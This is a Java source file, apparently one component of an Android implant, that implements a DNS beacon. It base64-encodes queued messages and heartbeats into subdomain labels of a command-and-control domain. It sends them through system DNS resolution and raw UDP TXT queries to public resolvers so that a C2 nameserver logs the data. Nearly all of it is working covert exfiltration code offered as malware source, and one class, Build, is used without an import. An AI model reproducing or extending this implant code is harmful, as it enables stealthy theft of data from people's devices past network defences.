// ============================================================
// FILE 15: comms/DNSBeacon.java
// ============================================================
package io.hackerai.implant.comms;

import android.content.Context;
import android.util.Log;

import java.io.IOException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.util.Base64;
import java.util.concurrent.LinkedBlockingQueue;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * DNSBeacon — exfiltrates data via DNS TXT queries.
 *
 * Mechanism:
 *   1. Encodes outbox messages as base64 subdomains
 *   2. Resolves e.g. <base64chunk>.c2.hackerai.io via DNS
 *   3. C2 nameserver logs the query (data received)
 *   4. Inbound commands encoded in TXT response
 *
 * This is a fallback high-latency channel (no persistent TCP).
 */
public class DNSBeacon {
    private static final String TAG = "DNSBeacon";
    private static final int MAX_LABEL_LEN = 63;

    private final Context ctx;
    private final String domain;
    private final String implantId;
    private final LinkedBlockingQueue<String> outbox;
    private final AtomicBoolean running = new AtomicBoolean(false);

    // C2 DNS resolver (public or custom)
    private final String[] resolvers = {
            "8.8.8.8",      // Google
            "1.1.1.1",      // Cloudflare
            "9.9.9.9"       // Quad9
    };
    private int resolverIdx = 0;

    public DNSBeacon(Context ctx, String domain, String implantId,
                     LinkedBlockingQueue<String> outbox) {
        this.ctx = ctx.getApplicationContext();
        this.domain = domain;
        this.implantId = implantId;
        this.outbox = outbox;
    }

    /** Start the DNS beacon loop */
    public void start() {
        if (!running.compareAndSet(false, true)) return;
        Thread beaconThread = new Thread(() -> {
            Log.i(TAG, "DNS beacon started.");
            while (running.get()) {
                try {
                    // Poll with 10s timeout (heartbeat interval)
                    String msg = outbox.poll(10, TimeUnit.SECONDS);
                    if (msg == null) {
                        // Send heartbeat
                        msg = "{\"type\":\"hb\",\"id\":\"" + implantId + "\"}";
                    }
                    if (msg.length() > 0) {
                        sendDnsQuery(msg);
                    }
                } catch (InterruptedException e) {
                    break;
                } catch (Exception e) {
                    Log.e(TAG, "DNS beacon error", e);
                }
            }
            Log.i(TAG, "DNS beacon stopped.");
        }, "dns-beacon");
        beaconThread.setDaemon(true);
        beaconThread.start();
    }

    /** Stop the beacon */
    public void stop() {
        running.set(false);
    }

    /**
     * Encode message as base64 and send as DNS TXT query.
     */
    private void sendDnsQuery(String plaintext) {
        try {
            String b64;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                b64 = Base64.getUrlEncoder().withoutPadding()
                        .encodeToString(plaintext.getBytes("UTF-8"));
            } else {
                b64 = android.util.Base64.encodeToString(
                        plaintext.getBytes("UTF-8"),
                        android.util.Base64.URL_SAFE | android.util.Base64.NO_WRAP
                );
            }

            // Split into DNS-safe label chunks (max 63 chars each)
            String[] chunks = splitIntoLabels(b64);
            String qname;

            if (chunks.length == 1) {
                qname = chunks[0] + "." + domain;
            } else {
                // Multi-label: encode first-chunk.rest.domain
                qname = chunks[0] + "." + domain;
                // Additional data goes into a second query
                for (int i = 1; i < chunks.length; i++) {
                    String extraQ = chunks[i] + "." + domain;
                    rawDnsQuery(extraQ);
                }
            }

            rawDnsQuery(qname);

            Log.d(TAG, "DNS beacon sent: " + b64.substring(0, Math.min(40, b64.length())) + "...");

        } catch (Exception e) {
            Log.e(TAG, "DNS encode/send error", e);
        }
    }

    /**
     * Raw DNS TXT lookup via UDP to a public resolver.
     * This uses the lightweight approach: InetAddress.getByName() which
     * triggers a system DNS resolution.
     *
     * For full TXT record support, we'd use dnsjava; this is a
     * fallback that works without extra libraries.
     */
    private void rawDnsQuery(String qname) {
        try {
            // InetAddress.getByName triggers A/AAAA lookup = data exfil via
            // the subdomain being logged by the authoritative C2 nameserver
            InetAddress addr = InetAddress.getByName(qname);
            Log.v(TAG, qname + " -> " + addr.getHostAddress());
        } catch (Exception e) {
            // NXDOMAIN expected — C2 logs the query regardless
            Log.v(TAG, qname + " -> NXDOMAIN (expected)");
        }

        // Also try via direct UDP to a public resolver (more reliable)
        try {
            sendUdpDnsQuery(qname);
        } catch (Exception ignored) {}
    }

    /**
     * Send a minimal DNS query via UDP directly to a resolver.
     * This is a simple implementation that sends the query bytes.
     * For production, use dnsjava or a similar library.
     */
    private void sendUdpDnsQuery(String qname) throws IOException {
        // Build minimal DNS query packet
        byte[] query = buildDnsQuery(qname);
        resolverIdx = (resolverIdx + 1) % resolvers.length;
        InetAddress resolver = InetAddress.getByName(resolvers[resolverIdx]);

        try (DatagramSocket socket = new DatagramSocket()) {
            socket.setSoTimeout(3000);
            DatagramPacket packet = new DatagramPacket(query, query.length, resolver, 53);
            socket.send(packet);

            // Read response (we don't need the content, just the round-trip)
            byte[] buf = new byte[512];
            DatagramPacket response = new DatagramPacket(buf, buf.length);
            socket.receive(response);
        }
    }

    /**
     * Build a minimal DNS query byte array for a TXT record lookup.
     * Transaction ID = 0x1337, flags = 0x0100 (standard query, recursion desired).
     */
    private byte[] buildDnsQuery(String qname) {
        try {
            // Encode the QNAME in DNS label format
            byte[] nameBytes = encodeDnsName(qname);

            int len = nameBytes.length + 16;
            byte[] query = new byte[len];
            int pos = 0;

            // Transaction ID
            query[pos++] = 0x13;
            query[pos++] = 0x37;
            // Flags: standard query, recursion desired
            query[pos++] = 0x01;
            query[pos++] = 0x00;
            // Questions = 1
            query[pos++] = 0x00;
            query[pos++] = 0x01;
            // Answer, Authority, Additional = 0
            query[pos++] = 0x00;
            query[pos++] = 0x00;
            query[pos++] = 0x00;
            query[pos++] = 0x00;
            query[pos++] = 0x00;
            query[pos++] = 0x00;

            // QNAME
            System.arraycopy(nameBytes, 0, query, pos, nameBytes.length);
            pos += nameBytes.length;

            // QTYPE = TXT (16)
            query[pos++] = 0x00;
            query[pos++] = 0x10;
            // QCLASS = IN (1)
            query[pos++] = 0x00;
            query[pos++] = 0x01;

            return query;
        } catch (Exception e) {
            Log.e(TAG, "Build DNS query failed", e);
            return new byte[0];
        }
    }

    /** Encode a domain name in DNS label format (e.g., "a.b" -> [1, 'a', 1, 'b', 0]) */
    private byte[] encodeDnsName(String name) throws Exception {
        byte[] nameUtf8 = name.getBytes("UTF-8");
        java.io.ByteArrayOutputStream bos = new java.io.ByteArrayOutputStream();
        int start = 0;
        for (int i = 0; i <= nameUtf8.length; i++) {
            if (i == nameUtf8.length || nameUtf8[i] == '.') {
                bos.write(i - start);
                bos.write(nameUtf8, start, i - start);
                start = i + 1;
            }
        }
        bos.write(0); // root label
        return bos.toByteArray();
    }

    /** Split a string into DNS-safe labels (max 63 chars each) */
    private String[] splitIntoLabels(String input) {
        int len = input.length();
        int count = (len + MAX_LABEL_LEN - 1) / MAX_LABEL_LEN;
        String[] labels = new String[count];
        for (int i = 0; i < count; i++) {
            int start = i * MAX_LABEL_LEN;
            int end = Math.min(start + MAX_LABEL_LEN, len);
            labels[i] = input.substring(start, end);
        }
        return labels;
    }
}
